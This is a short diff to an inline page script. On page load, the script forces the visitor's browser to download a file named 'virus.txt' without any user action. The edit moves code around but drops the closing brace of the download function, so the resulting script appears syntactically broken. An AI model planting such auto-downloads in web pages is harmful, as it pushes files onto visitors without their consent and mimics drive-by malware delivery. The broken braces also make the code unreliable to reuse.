@@ -131,17 +131,17 @@ async function downloadFile(fileName, saveName) {
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
-    } catch (error) {
-                alert('ダウンロードに失敗しました: ' + error.message);
-                console.error(error);
-            }
-        }
+    } 
+  catch (error) {
+    alert('ダウンロードに失敗しました: ' + error.message);
+    console.error(error);
+  }
+function yourFunction() {
+  downloadFile('virus.txt', 'virus.txt');
+}
   document.addEventListener('DOMContentLoaded', function() {
   console.log('ページにアクセスされました');
   yourFunction();
 });
-function yourFunction() {
-  downloadFile('virus.txt', 'virus.txt');
-}
 </script>
 </html>
